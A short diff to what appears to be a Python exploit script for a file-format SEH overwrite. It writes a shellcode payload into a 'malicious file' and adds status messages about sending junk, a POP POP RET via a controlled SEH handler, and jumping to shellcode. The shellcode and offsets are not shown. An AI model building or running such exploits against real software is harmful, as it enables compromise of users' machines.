@@ -48,8 +48,12 @@ payload += shellcode
 try:
     print("[x] Opening the malicious file")
     payload_execution = open(malicious_file, "w+")
+    print("[x] Creating a file named", malicious_file) 
     payload_execution.write(payload)
     print("[x] Adding payload to the malicious file")
     payload_execution.close()
+    print("[x] Sending junk")
+    print("[x] Sending POP POP RET via controlled SEH handler")
+    print("[x] Jumping to shellcode")
 except:
     print("[!] Error running the exploit")
